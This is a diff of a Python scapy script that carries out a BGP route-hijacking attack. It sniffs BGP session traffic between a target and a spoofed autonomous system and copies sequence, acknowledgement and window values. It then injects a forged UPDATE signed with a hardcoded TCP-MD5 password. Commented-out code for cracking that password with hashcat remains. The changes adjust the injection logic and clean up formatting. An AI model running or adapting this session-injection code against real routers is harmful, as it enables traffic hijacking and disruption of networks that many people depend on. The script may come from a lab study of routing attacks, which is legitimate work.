@@ -1,6 +1,6 @@
 import sys
 from scapy.all import *
-from scapy.layers.inet import IP,TCP
+from scapy.layers.inet import IP, TCP
 from scapy.contrib.bgp import *
 from BGP_crafter import craft_BGP_update_packet, sign_single_packet
 import TCP_MD5_parser
@@ -16,14 +16,16 @@ NEXT_HOP = "192.168.12.2"
 MULTI_EXIT_DISC = 0
 ORIGIN = "IGP"
 PATH = [2]
-#LOCAL_PREF = 87
+# LOCAL_PREF = 87
 LOCAL_PREF = 0
 BGP_PORT = 179
 
-#global variables
+# global variables
 SEQUENCE_NUMBER = -1
 ACK_NUMBER = -1
 BGP_password = ""
+
+
 #
 # def break_password(pkt, mask):
 #     """Takes a scapy packet and a hashcat mask, runs a hashcat mask attack on the TCP MD5 signature to find the password"""
@@ -67,30 +69,30 @@ BGP_password = ""
 #                 return True
 #     return False
 
-def inject_malicious_packet(seq_num, ack_num, source_port):
+def inject_malicious_packet(seq_num, ack_num, source_port, windo):
     """crafts and sends a BGPUpdate to the targeted AS spoofing the AS we want to spoof"""
     ip = IP(src=IP_TO_SPOOF, dst=IP_TARGET)
-    tcp = TCP(sport=source_port, dport=BGP_PORT, flags="PA")
+    tcp = TCP(sport=BGP_PORT, dport=source_port, flags="PA")
     tcp.seq = seq_num
     tcp.ack = ack_num
-    #hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
+    tcp.window = windo
+    print('numbers: ', tcp.seq, tcp.ack, tcp.window)
+    # hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
     bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, next_hop=NEXT_HOP, origin=ORIGIN,
                                          multi_exit_disc=MULTI_EXIT_DISC)
-    packet = Ether() / ip / tcp / bgp_packet
-    packet.display()
+    packet = Ether(dst='c4:02:30:65:00:00', src='c4:02:30:65:00:00') / ip / tcp / bgp_packet
+    # packet.display()
     signed_packet = sign_single_packet(packet, BGP_password)
-    #recompute packet to compute checksums
+    # recompute packet to compute checksums
     signed_packet = signed_packet.__class__(bytes(signed_packet))
-    #signed_packet.show()
-    signed_packet.display()
-    #wrpcap('update_example_crafted .pcap', signed_packet)
-    print("MALICOUS PACKET CRAFTED")
-    send(signed_packet)
     signed_packet.show()
-    #print("Attack done, exiting")
+    # wrpcap('update_example_crafted .pcap', signed_packet)
+    print("MALICOUS PACKET CRAFTED")
+    # send(signed_packet)
+    sendp(signed_packet)
+    # sr1(signed_packet)
+    # print("Attack done, exiting")
     exit()
-
-
 
 
 def packet_callback(captured_packet):
@@ -100,48 +102,62 @@ def packet_callback(captured_packet):
     # Then, set sequence number of the malicious packet to seq number of the captured packet:
     #   malicious_bgp_packet[TCP] = captured_packet[TCP].seq (something like that)
     if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
-        #BGP packet or ACK
+        # BGP packet or ACK
         # if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
         #     #Is that part really useful ?
         #     #packet going to the targeted AS from the AS we want to spoof.
         #     #take the seq and ack numbers from the packet
         #     SEQUENCE_NUMBER = captured_packet[TCP].seq
         #     ACK_NUMBER = captured_packet[TCP].ack
-        if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
-            #packet going to the AS we want to spoof from the targeted AS
-            #This packet is interesting if it is an ACK for a previously sent packet
+        if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF and captured_packet[
+            TCP].flags == "A":
+            # packet going to the AS we want to spoof from the targeted AS
+            # This packet is interesting if it is an ACK for a previously sent packet
             # if captured_packet[TCP].flags == "A":
             # if the targeted AS sends ACK
-            SEQUENCE_NUMBER = captured_packet[TCP].ack
-            ACK_NUMBER = captured_packet[TCP].seq
+
+            # SEQUENCE_NUMBER = captured_packet[TCP].ack
+            # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
+
+            SEQUENCE_NUMBER = captured_packet[TCP].seq
+            ACK_NUMBER = captured_packet[TCP].ack
+
+            # ip_total_len = rp.getlayer(IP).len
+            # ip_header_len = rp.getlayer(IP).ihl * 32 / 8
+            # tcp_header_len = rp.getlayer(TCP).dataofs * 32 / 8
+            # tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
+
             # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
             # now we have a window to send a malicious BGP packet
             source_port = captured_packet[TCP].dport
-            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, source_port)
-
-
+            window = captured_packet[TCP].window
+            print('Numbers: ', SEQUENCE_NUMBER, ACK_NUMBER, source_port, window)
+            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, source_port, window)
 
 
 def main(argv):
-    #if len(argv) != 2:
+    # if len(argv) != 2:
     #    print(f"Usage: {argv[0]} <interface_name>")
     #    print(f"\n\t i.e.: {argv[0]} \"eth0\"")
     #    sys.exit(-1)
 
-    #INTERFACE = argv[1]
+    # INTERFACE = argv[1]
 
-    #print("[*] Sniffing a packet to break TCP MD5 password")
-    #packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
-    #print("[*] Packet found !")
-    #print("[*] Breaking password")
+    # print("[*] Sniffing a packet to break TCP MD5 password")
+    # packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
+    # print("[*] Packet found !")
+    # print("[*] Breaking password")
     global BGP_password
     BGP_password = 'azerty'
-    inject_malicious_packet(seq_num=1, ack_num=1, source_port=19108)
-    #BGP_password = break_password(packet_to_break, hashcat_mask)
-    #print("[*] Password broken: " + BGP_password)
-    sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
-
+    # seq=int(argv[1])
+    # ack=int(argv[2])
+    # window=int(argv[3])
+    # print('Numbers: ', seq, ack, window)
+    # inject_malicious_packet(seq_num=seq, ack_num=ack, source_port=19108, windo=window)
+    # BGP_password = break_password(packet_to_break, hashcat_mask)
+    # print("[*] Password broken: " + BGP_password)
+    sniff(prn=lambda p: packet_callback(p), filter="tcp", iface=INTERFACE)
 
 
 if __name__ == "__main__":
-  main(sys.argv)
+    main(sys.argv)
